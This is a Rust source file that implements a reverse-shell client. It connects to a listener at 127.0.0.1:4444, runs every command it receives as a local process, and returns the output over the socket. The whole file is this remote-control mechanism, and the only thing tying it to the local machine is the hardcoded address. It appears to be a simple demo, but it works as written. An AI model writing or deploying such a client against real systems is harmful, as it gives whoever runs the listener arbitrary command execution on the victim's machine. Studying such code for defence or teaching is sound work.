use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Connecting to server at 127.0.0.1:4444...");

    // Connect to the server
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server!");

    let mut reader = BufReader::new(stream.try_clone()?);
    let mut buffer = String::new();

    loop {
        buffer.clear();

        // Read command from server
        match reader.read_line(&mut buffer) {
            Ok(0) => {
                // Connection closed by server
                println!("Connection closed by server");
                break;
            }
            Ok(_) => {
                // Remove newline characters
                let command = buffer.trim();

                if command.is_empty() {
                    continue;
                }

                println!("Received command: {}", command);

                // Execute the command
                let output = execute_command(command);

                // Send result back to server
                if let Err(e) = send_response(&mut stream, &output) {
                    eprintln!("Failed to send response: {}", e);
                    break;
                }
            }
            Err(e) => {
                eprintln!("Failed to read from server: {}", e);
                break;
            }
        }
    }

    Ok(())
}

fn execute_command(command: &str) -> String {
    println!("Executing command: {}", command);

    // Split command into parts
    let parts: Vec<&str> = command.split_whitespace().collect();

    if parts.is_empty() {
        return "Empty command".to_string();
    }

    let program = parts[0];
    let args = &parts[1..];

    match Command::new(program)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
    {
        Ok(output) => {
            if output.status.success() {
                String::from_utf8_lossy(&output.stdout).to_string()
            } else {
                format!(
                    "Command failed with exit code: {}\n{}",
                    output.status,
                    String::from_utf8_lossy(&output.stderr)
                )
            }
        }
        Err(e) => {
            format!("Failed to execute command: {}", e)
        }
    }
}

fn send_response(stream: &mut TcpStream, response: &str) -> Result<(), Box<dyn std::error::Error>> {
    stream.write_all(response.as_bytes())?;
    stream.write_all(b"\n")?; // Add newline as delimiter
    stream.flush()?;
    Ok(())
}
